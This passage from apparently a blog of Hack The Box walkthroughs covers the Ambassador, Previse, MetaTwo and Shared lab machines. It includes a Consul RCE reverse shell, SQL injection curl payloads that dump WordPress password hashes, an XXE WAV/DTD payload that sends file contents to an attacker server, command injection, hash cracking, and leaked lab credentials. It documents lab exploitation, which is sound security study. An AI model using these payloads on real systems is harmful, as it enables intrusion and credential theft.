MySQL [(none)]> use whackywidget;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMySQL [whackywidget]> show tables;+------------------------+| Tables_in_whackywidget |+------------------------+| users                  |+------------------------+1 row in set (0.053 sec)MySQL [whackywidget]> select * from users;+-----------+------------------------------------------+| user      | pass                                     |+-----------+------------------------------------------+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |+-----------+------------------------------------------+

We can see that developer’s password is encoded in base64 so let’s decode it and try to connect with it on SSH

└─$ echo -n YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | base64 -danEnglishManInNewYork027468

Trying to connect to the SSH we can see that we have successfully logged in

Privilege Escalation

Information Gathering ( Operating System )

developer@ambassador:~$ cat /etc/*-releaseDISTRIB_ID=UbuntuDISTRIB_RELEASE=20.04DISTRIB_CODENAME=focalDISTRIB_DESCRIPTION="Ubuntu 20.04.5 LTS"NAME="Ubuntu"VERSION="20.04.5 LTS (Focal Fossa)"ID=ubuntuID_LIKE=debianPRETTY_NAME="Ubuntu 20.04.5 LTS"VERSION_ID="20.04"HOME_URL="https://www.ubuntu.com/"SUPPORT_URL="https://help.ubuntu.com/"BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"VERSION_CODENAME=focalUBUNTU_CODENAME=focal

Looking on the developer’s home we can see a .gitconfig file.
Let’s try to view the logs and maybe find something that was leaked.

We can see that it’s using consul so searching for this for a RCE using API we found this link ( https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API )
By executing the python exploit we can see that we have got a reverse shell as ROOT

developer@ambassador:/dev/shm$ python3 xpl.py 127.0.0.1 8500 10.10.14.101 443 bb03b43b-1d81-d62b-24b5-39540ee469b5[+] Request sent successfully, check your listenerdeveloper@ambassador:/dev/shm$

entry.title: Previse
entry.content:
Information Gathering

NMAP

  • command used: ( scanning for all the ports fast and efficient)

    sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.104 -oG nmap/allPorts

  • command used: ( scanning the ports we got )

    nmap -A -sC -sV -p22,80 -Pn -oA nmap/full_scan 10.10.11.104

-> All ports scan:

Nmap scan report for 10.10.11.104Host is up, received user-set (0.14s latency).Scanned at 2021-07-18 13:05:24 EDT for 18sNot shown: 63101 closed ports, 2431 filtered portsReason: 63101 resets and 2431 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT      STATE SERVICE  REASON22/tcp    open  ssh      syn-ack ttl 6380/tcp    open  http     syn-ack ttl 63

-> All ports scan with flags:

PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-server-header: Apache/2.4.29 (Ubuntu)| http-title: Previse Login|_Requested resource was login.phpService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Services

TCP 22 ( Default port for SSH )

-> SSH package version - Might be able to find the OS and version.
-> SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?)
-> SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)

-> SSH package version:

nc -vn 10.10.11.104 22
  • output:
    └─$ nc -vn 10.10.11.104 22  (UNKNOWN) [10.10.11.104] 22 (ssh) openSSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3

-> SSH key fingerprint:

ssh root@10.11.1.72
  • output:
    └─$ ssh root@10.10.11.104                                             The authenticity of host '10.10.11.104 (10.10.11.104)' can't be established.ECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.104' (ECDSA) to the list of known hosts.
TCP 80 ( Default port for HTTP )

-> Web Server:

└─$ curl -i http://10.10.11.104                                                                                                                130 ⨯HTTP/1.1 302 FoundDate: Wed, 03 Nov 2021 15:10:17 GMTServer: Apache/2.4.29 (Ubuntu)Set-Cookie: PHPSESSID=09s5csgct87olsot4rjnbav2j2; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidatePragma: no-cacheLocation: login.phpContent-Length: 2801Content-Type: text/html; charset=UTF-8<!DOCTYPE html><html>    <head>        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />        <meta charset="utf-8" />                        <meta name="viewport" content="width=device-width, initial-scale=1.0" />        <meta name="description" content="Previse rocks your socks." />        <meta name="author" content="m4lwhere" />        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />        <link rel="icon" href="/favicon.ico" type="image/x-icon" />        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">        <link rel="manifest" href="/site.webmanifest">        <link rel="stylesheet" href="css/uikit.min.css" />        <script src="js/uikit.min.js"></script>        <script src="js/uikit-icons.min.js"></script>   <title>Previse Home</title>

-> Directory Listing:

gobuster dir -u http://10.10.11.104/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php

-> output:

└─$ gobuster dir -u http://10.10.11.104/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php                                    130 ⨯===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.11.104/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Extensions:              php[+] Timeout:                 10s===============================================================2021/11/03 10:56:13 Starting gobuster in directory enumeration mode===============================================================/.php                 (Status: 403) [Size: 277]/.html                (Status: 403) [Size: 277]/login.php            (Status: 200) [Size: 2224]/.html.php            (Status: 403) [Size: 277] /index.php            (Status: 302) [Size: 2801] [--> login.php]/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]/.htm                 (Status: 403) [Size: 277]                               /.htm.php             (Status: 403) [Size: 277]                               /download.php         (Status: 302) [Size: 0] [--> login.php]                 /logout.php           (Status: 302) [Size: 0] [--> login.php]                 /files.php            (Status: 302) [Size: 6069] [--> login.php]              /logs.php             (Status: 302) [Size: 0] [--> login.php]                 /config.php           (Status: 200) [Size: 0]                                 /header.php           (Status: 200) [Size: 980]                               /footer.php           (Status: 200) [Size: 217]/nav.php ** THIS ONE I FOUND WITH DIRECTORY-LIST-2.3-MEDIUM.TXT **

Vulnerability Research

EXPLOITATION

As we can see we have access to /nav.php but when we click to a link we get redirected back to /index.php, so we need to find a way to bypass that

So in order to get rid of that we can use BURPSUITE by intercepting the request -> Do intercept -> Response to this request and keep forwarding until you can see the HTTP STATUS CODE 302 and change it to 200 OK

Modify it and then forward it again.

As you can see we successfully bypassed the restriction.
Now we can create a BLANK account:

admin:admin

And try to access it via the login form from /login.php

Post Enumeration

Under the /files we can see that we have the sitebackup. It could potentially contain some important information so we are downloading it locally.

  • SITEBACKUP.zip
    └─$ unzip siteBackup.zip Archive:  siteBackup.zipinflating: accounts.php            inflating: config.php              inflating: download.php            inflating: file_logs.php           inflating: files.php               inflating: footer.php              inflating: header.php              inflating: index.php               inflating: login.php               inflating: logout.php              inflating: logs.php                inflating: nav.php                 inflating: status.php

After reading the files we can see that the logs.php is containing some interesting information about delims.

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");

We can see that he is executing via exec the log_process.py with the parameter we give it. So we can potentially try to do some command injection in order to get the low-priv shell.

Privilege Escalation

Information Gathering ( Operating System )

www-data@previse:/$ cat /etc/*-releasecat /etc/*-releaseDISTRIB_ID=UbuntuDISTRIB_RELEASE=18.04DISTRIB_CODENAME=bionicDISTRIB_DESCRIPTION="Ubuntu 18.04.5 LTS"NAME="Ubuntu"VERSION="18.04.5 LTS (Bionic Beaver)"ID=ubuntuID_LIKE=debianPRETTY_NAME="Ubuntu 18.04.5 LTS"VERSION_ID="18.04"HOME_URL="https://www.ubuntu.com/"SUPPORT_URL="https://help.ubuntu.com/"BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"VERSION_CODENAME=bionicUBUNTU_CODENAME=bionicwww-data@previse:/$ uname -auname -aLinux previse 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

-> netstat:

www-data@previse:/$ netstat -tulpnnetstat -tulpn(Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.)Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   tcp6       0      0 :::80                   :::*                    LISTEN      -                   tcp6       0      0 :::22                   :::*                    LISTEN      -                   udp        0      0 127.0.0.53:53           0.0.0.0:*
  • So as we can see locally it’s running a MySQL server so we could try to connect to it with the credentials we got from SITEBACKUP.zip in config.php
    ```php
    └─$ cat config.php

function connectDB(){
$host = ‘localhost’;
$user = ‘root’;
$passwd = ‘mySQL_p@ssw0rd!:)’;
$db = ‘previse’;
$mycon = new mysqli($host, $user, $passwd, $db);
return $mycon;
}
?>

{% asset_img 20211103171908.png %}So as we can see we have 3 hashes...But the one that we need is for m4lwhere because we can see that "he" is the only user on the machine.After cracking the hash with *john* we know that his password is

ilovecody112235!

```

Aaannnd we got USER

Privilege Escalation

By runnining sudo -l we can see that he can run as root the following

So my way to go in this case is the vulnerability called PATH INJECTION by modifyin the PATH to point to our location so when we run that bash script it will take “our” gzip and run it.

entry.title: MetaTwo
entry.content:
Information Gathering

NMAP

  • command used: ( scanning for all the ports fast and efficient)

    sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.186 -oG nmap/allPorts

  • command used: ( scanning the ports we got )

    nmap -A -sC -sV -p21,22,80 10.10.11.186 -Pn

-> All ports scan:

Not shown: 43073 closed tcp ports (reset), 22459 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON21/tcp open  ftp     syn-ack ttl 6322/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63

-> All ports scan with flags:

PORT   STATE SERVICE VERSION21/tcp open  ftp?22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: |   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)80/tcp open  http    nginx 1.18.0|_http-server-header: nginx/1.18.0|_http-title: Did not follow redirect to http://metapress.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Services

TCP 21 ( Default port for FTP )

-> Anonymous Authentification:

└─$ ftp 10.10.11.186Connected to 10.10.11.186.220 ProFTPD Server (Debian) [::ffff:10.10.11.186]Name (10.10.11.186:kali): anonymous331 Password required for anonymousPassword: 530 Login incorrect.ftp: Login failed
TCP 22 ( Default port for SSH )

-> SSH package version - Might be able to find the OS and version.
-> SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?)
-> SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)

-> SSH package version:

nc -vn 10.10.11.186 22
  • output:
    └─$ nc -nv 10.10.11.186 22                                           (UNKNOWN) [10.10.11.186] 22 (ssh) open

-> SSH key fingerprint:

ssh root@10.10.11.186
  • output:
    └─$ ssh root@10.10.11.186The authenticity of host '10.10.11.186 (10.10.11.186)' can't be established.RSA key fingerprint is SHA256:75SZkY5Vi8mgCNwavHQo2t6I3P1O/5SUAthmAWKBQOw.Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
TCP 80 ( Default port for HTTP )

-> Web Server:

└─$ curl --head http://10.10.11.186                                                      HTTP/1.1 302 Moved TemporarilyServer: nginx/1.18.0Date: Fri, 04 Nov 2022 11:56:46 GMTContent-Type: text/htmlContent-Length: 145Connection: keep-aliveLocation: http://metapress.htb/

We can see that it’s redirecting us to http://metapress.htb/ so let’s add the vhost into our /etc/hosts file.
After adding it we can see that we can successfully view the page:

└─$ curl --head http://metapress.htbHTTP/1.1 200 OKServer: nginx/1.18.0Date: Fri, 04 Nov 2022 12:00:34 GMTContent-Type: text/html; charset=UTF-8Connection: keep-aliveX-Powered-By: PHP/8.0.24Set-Cookie: PHPSESSID=5f4n56vga1sl658au9sjiinn71; path=/Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidatePragma: no-cacheLink: <http://metapress.htb/wp-json/>; rel="https://api.w.org/"

-> whatweb output:

└─$ whatweb http://metapress.htb                       http://metapress.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.186], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], PoweredBy[--], Script, Title[MetaPress – Official company site], UncommonHeaders[link], WordPress[5.6.2], X-Powered-By[PHP/8.0.24], nginx[1.18.0]

We can see that it’s running WordPress 5.6.2 so let’s enumerate it.

-> Directory Listing:

└─$ gobuster dir -u http://metapress.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://metapress.htb/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Timeout:                 10s===============================================================2022/11/04 08:03:28 Starting gobuster in directory enumeration mode===============================================================/about                (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]/rss                  (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]    /login                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-login.php]/events               (Status: 301) [Size: 0] [--> http://metapress.htb/events/]     /0                    (Status: 301) [Size: 0] [--> http://metapress.htb/0/]          /feed                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/]       /atom                 (Status: 301) [Size: 0] [--> http://metapress.htb/feed/atom/]  /s                    (Status: 301) [Size: 0] [--> http://metapress.htb/sample-page/]/a                    (Status: 301) [Size: 0] [--> http://metapress.htb/about-us/]   /c                    (Status: 301) [Size: 0] [--> http://metapress.htb/cancel-appointment/]/wp-content           (Status: 301) [Size: 169] [--> http://metapress.htb/wp-content/]      /admin                (Status: 302) [Size: 0] [--> http://metapress.htb/wp-admin/]          /t                    (Status: 301) [Size: 0] [--> http://metapress.htb/thank-you/]         /e                    (Status: 301) [Size: 0] [--> http://metapress.htb/events/]            /h                    (Status: 301) [Size: 0] [--> http://metapress.htb/hello-world/]

Going on the /events/ endpoint and viewing the web page we can see that it’s using the bookingpress plugin.
Searching on google we found that this plugin is vulnerable to SQL Injection
https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357

Basic Details

After that just forward the request and intercept it in order to grab the wpnonce.

Once you’ve done that you are ready to use the exploit.

└─$ curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' -d "action=bookingpress_front_get_category_services&_wpnonce=f1c5d884ac&category_id=33&total_service=1) union all select database(),1,1,1,1,1,1,1,1-- -"[{"bookingpress_service_id":"blog","bookingpress_category_id":"1","bookingpress_service_name":"1","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"1","bookingpress_service_duration_unit":"1","bookingpress_service_description":"1","bookingpress_service_position":"1","bookingpress_servicedate_created":"1","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg"}]

After playing with some commands to make it cleaner we got:

curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' -d "action=bookingpress_front_get_category_services&_wpnonce=f1c5d884ac&category_id=33&total_service=1) union all select database(),1,1,1,1,1,1,1,1-- -" | sed 's/\\//g' | jq | grep service_id | awk '{print $4}' FS='"'*blog*

Dumping the information_schema:

└─$ curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' -d "action=bookingpress_front_get_category_services&_wpnonce=f1c5d884ac&category_id=33&total_service=1) union select all group_concat(schema_name),1,1,1,1,1,1,1,1 from information_schema.schemata-- -" | sed 's/\\//g' | jq | grep service_id | awk '{print $4}' FS='"'*information_schema,blog*

Dumping the tables:

└─$ curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' -d "action=bookingpress_front_get_category_services&_wpnonce=f1c5d884ac&category_id=33&total_service=1) union select all group_concat(table_name),1,1,1,1,1,1,1,1 from information_schema.tables where table_schema = database()-- -" | sed 's/\\//g' | jq | grep service_id | awk '{print $4}' FS='"'*wp_options,wp_term_taxonomy,wp_bookingpress_servicesmeta,wp_commentmeta,wp_users,wp_bookingpress_customers_meta,wp_bookingpress_settings,wp_bookingpress_appointment_bookings,wp_bookingpress_customize_settings,wp_bookingpress_debug_payment_log,wp_bookingpress_services,wp_termmeta,wp_links,wp_bookingpress_entries,wp_bookingpress_categories,wp_bookingpress_customers,wp_bookingpress_notifications,wp_usermeta,wp_terms,wp_bookingpress_default_daysoff,wp_comments,wp_bookingpress_default_workhours,wp_postmeta,wp_bookingpress_form_fields,wp_bookingpress_payment_logs,wp_posts,wp_term_relationships*

Dumping the users from wp_users:

└─$ curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' -d "action=bookingpress_front_get_category_services&_wpnonce=f1c5d884ac&category_id=33&total_service=1) union select all group_concat(user_login),1,1,1,1,1,1,1,1 from wp_users-- -" | sed 's/\\//g' | jq | grep service_id | awk '{print $4}' FS='"'*admin,manager*

Dumping the hashes:

└─$ curl -s 'http://metapress.htb/wp-admin/admin-ajax.php' -d "action=bookingpress_front_get_category_services&_wpnonce=f1c5d884ac&category_id=33&total_service=1) union select all group_concat(user_pass),1,1,1,1,1,1,1,1 from wp_users-- -" | sed 's/\\//g' | jq | grep service_id | awk '{print $4}' FS='"'$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70

Now that we have the hashes we can try to crack them in order to retrieve the passwords. We can do this using John The Ripper:

└─$ sudo john pass.hash --wordlist=/opt/rockyou.txt [sudo] password for kali: Created directory: /root/.johnUsing default input encoding: UTF-8Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])Cost 1 (iteration count) is 8192 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuspartylikearockstar (manager)

Now with that password we could log into the wordpress admin panel and try to get a shell from there.

After logging in we can see that we just have the media functionality.

So with that info in mind we can try to search for some exploits. After a while I found this interesting blog that it’s exploiting this using XXE
https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/
With this we can try to extract wthe wp_config.php file.

payload.wav:

echo -en 'RIFF\x85\x00\x00\x00WAVEiXML\x79\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://IP/pwned.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

pwned.dtd:

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hostname"><!ENTITY % init "<!ENTITY % trick SYSTEM 'http://IP/?p=%file;'>" >

Now once you run it you will receive the wp_config.php file as a base64 string in the python server:

> sudo python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.129.63.197 - - "GET /pwned.dtd HTTP/1.1" 200 -10.129.63.197 - - "GET /? HTTP/1.1" 200 -

wp_config.php:

└─$ cat wp_config.php <?php/** The name of the database for WordPress */define( 'DB_NAME', 'blog' );/** MySQL database username */define( 'DB_USER', 'blog' );/** MySQL database password */define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );/** MySQL hostname */define( 'DB_HOST', 'localhost' );/** Database Charset to use in creating database tables. */define( 'DB_CHARSET', 'utf8mb4' );/** The Database Collate type. Don't change this if in doubt. */define( 'DB_COLLATE', '' );define( 'FS_METHOD', 'ftpext' );define( 'FTP_USER', 'metapress.htb' );define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );define( 'FTP_HOST', 'ftp.metapress.htb' );define( 'FTP_BASE', 'blog/' );define( 'FTP_SSL', false );

Now with those credentials we can try to log in on FTP:

└─$ ftp 10.10.11.186Connected to 10.10.11.186.220 ProFTPD Server (Debian) [::ffff:10.10.11.186]Name (10.10.11.186:kali): metapress.htb331 Password required for metapress.htbPassword: 230 User metapress.htb logged inRemote system type is UNIX.Using binary mode to transfer files.ftp> ls229 Entering Extended Passive Mode (|||30551|)150 Opening ASCII mode data connection for file listdrwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blogdrwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer226 Transfer complete
FTP Enumeration

We can see that it’s using an email system so most probably it will have some credentials stored there for the email that we can probably use to connect on the SSH
send_mail.php:

└─$ cat send_email.php [...]$mail->Host = "mail.metapress.htb";$mail->SMTPAuth = true;                          $mail->Username = "jnelson@metapress.htb";                 $mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           $mail->SMTPSecure = "tls";                           $mail->Port = 587;
SSH Connection

Privilege Escalation

Information Gathering ( Operating System )

jnelson@meta2:~$ cat /etc/*-releasePRETTY_NAME="Debian GNU/Linux 11 (bullseye)"NAME="Debian GNU/Linux"VERSION_ID="11"VERSION="11 (bullseye)"VERSION_CODENAME=bullseyeID=debianHOME_URL="https://www.debian.org/"SUPPORT_URL="https://www.debian.org/support"BUG_REPORT_URL="https://bugs.debian.org/"

User

jnelson@meta2:~$ iduid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)jnelson@meta2:~$ groupsjnelsonjnelson@meta2:~$ ls -lahtotal 32Kdrwxr-xr-x 4 jnelson jnelson 4.0K Oct 25 12:53 .drwxr-xr-x 3 root    root    4.0K Oct  5 15:12 ..lrwxrwxrwx 1 root    root       9 Jun 26 15:59 .bash_history -> /dev/null-rw-r--r-- 1 jnelson jnelson  220 Jun 26 15:46 .bash_logout-rw-r--r-- 1 jnelson jnelson 3.5K Jun 26 15:46 .bashrcdrwxr-xr-x 3 jnelson jnelson 4.0K Oct 25 12:51 .localdr-xr-x--- 3 jnelson jnelson 4.0K Oct 25 12:52 .passpie-rw-r--r-- 1 jnelson jnelson  807 Jun 26 15:46 .profile-rw-r----- 1 root    jnelson   33 Nov  4 12:35 user.txt

We can see that this user has a .passpie folder with a .keys file.

jnelson@meta2:~/.passpie$ cat .keys | tail -n 45-----BEGIN PGP PRIVATE KEY BLOCK----------END PGP PRIVATE KEY BLOCK-----

With this we can use gpg2john in order to crack it.

┌──(kali㉿kali)-[~/Desktop/HackTheBox/metatwo]└─$ sudo gpg2john key.key > hashFile key.key┌──(kali㉿kali)-[~/Desktop/HackTheBox/metatwo]└─$ cat hash Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::key.key

Now we can crack it using john the ripper:

└─$ sudo john hash --wordlist=/opt/rockyou.txt Using default input encoding: UTF-8Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])Cost 1 (s2k-count) is 65011712 for all loaded hashesCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashesCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusblink182         (Passpie)

Now that we have the password we can try to export the new.pass
new.pass:

jnelson@meta2:/dev/shm$ cat new.pass -----BEGIN PGP MESSAGE----------END PGP MESSAGE-----

After exporting we can see the message:

jnelson@meta2:/dev/shm$ cat new.pass credentials:- comment: ''  fullname: root@ssh  login: root  modified: 2022-06-26 08:58:15.621572  name: ssh  password: !!python/unicode 'p7qfAZt4_A1xo_0x'- comment: ''  fullname: jnelson@ssh  login: jnelson  modified: 2022-06-26 08:58:15.514422  name: ssh  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'handler: passpieversion: 1.0

With that we can log in as root and extract the root.txt

jnelson@meta2:/dev/shm$ su - rootPassword: root@meta2:~# cat root.txt 5c558dbc463a6f0ae9304a9829f5944aroot@meta2:~#

entry.title: Shared
entry.content:
Information Gathering

NMAP

  • command used: ( scanning for all the ports fast and efficient)

    sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.11.172 -oG nmap/allPorts

  • command used: ( scanning the ports we got )

    nmap -A -sC -sV -p22,80,443 10.10.11.172 -Pn

-> All ports scan:

Not shown: 65518 closed tcp ports (reset), 14 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT    STATE SERVICE REASON22/tcp  open  ssh     syn-ack ttl 6380/tcp  open  http    syn-ack ttl 63443/tcp open  https   syn-ack ttl 63

-> All ports scan with flags:

Nmap scan report for 10.10.11.172Host is up (0.046s latency).PORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: |   3072 91:e8:35:f4:69:5f:c2:e2:0e:27:46:e2:a6:b6:d8:65 (RSA)|   256 cf:fc:c4:5d:84:fb:58:0b:be:2d:ad:35:40:9d:c3:51 (ECDSA)|_  256 a3:38:6d:75:09:64:ed:70:cf:17:49:9a:dc:12:6d:11 (ED25519)80/tcp  open  http     nginx 1.18.0|_http-title: Did not follow redirect to http://shared.htb|_http-server-header: nginx/1.18.0443/tcp open  ssl/http nginx 1.18.0|_http-title: Did not follow redirect to https://shared.htb| ssl-cert: Subject: commonName=*.shared.htb/organizationName=HTB/stateOrProvinceName=None/countryName=US| Not valid before: 2022-03-20T13:37:14|_Not valid after:  2042-03-15T13:37:14| tls-nextprotoneg: |   h2|_  http/1.1|_http-server-header: nginx/1.18.0|_ssl-date: TLS randomness does not represent time| tls-alpn: |   h2|_  http/1.1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Services

TCP 22 ( Default port for SSH )

-> SSH package version - Might be able to find the OS and version.
-> SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port/service?)
-> SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)

-> SSH package version:

nc -vn 10.10.11.172 22
  • output:
    └─$ nc -nv 10.10.11.172 22                                           (UNKNOWN) [10.10.11.172] 22 (ssh) open

-> SSH key fingerprint:

ssh root@10.10.11.172
  • output:
    └─$ ssh root@10.10.11.172The authenticity of host '10.10.11.172 (10.10.11.172)' can't be established.RSA key fingerprint is SHA256:75SZkY5Vi8mgCNwavHQo2t6I3P1O/5SUAthmAWKBQOw.Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Looking on the NMAP scan we can see that it’s redirecting us to https://shared.htb so let’s add it on our /etc/hosts file.

TCP 80 ( Default port for HTTP )

-> Web Server:

└─$ curl -i http://shared.htb/HTTP/1.1 301 Moved PermanentlyServer: nginx/1.18.0Date: Tue, 25 Oct 2022 19:00:42 GMTContent-Type: text/html; charset=utf-8Transfer-Encoding: chunkedConnection: keep-aliveCache-Control: no-cacheLocation: https://shared.htb/
  • when we try to access http://shared.htb we can see that we are being redirected to the HTTPS server
  • following the address location we get:
    └─$ curl -i https://shared.htb/ -k         HTTP/2 302 server: nginx/1.18.0date: Tue, 25 Oct 2022 19:02:34 GMTcontent-type: text/html; charset=utf-8location: https://shared.htb/index.phpcache-control: no-cache

We can see that the webserver uses PHP so maybe the attack vector we will need to use will be something that has a connection with PHP

-> WebServer Picture:

-> wfuzz:

└─$ wfuzz -u 'https://shared.htb/FUZZ.php' -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw 892********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: https://shared.htb/FUZZ.phpTotal requests: 220560=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    =====================================================================000000007:   302        0 L      0 W        0 Ch        "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                                                          000000014:   403        7 L      9 W        153 Ch      "https://shared.htb/.php"                                                                                                                                                  000000001:   302        0 L      0 W        0 Ch        "# directory-list-2.3-medium.txt"                                                                                                                                          000000003:   302        0 L      0 W        0 Ch        "# Copyright 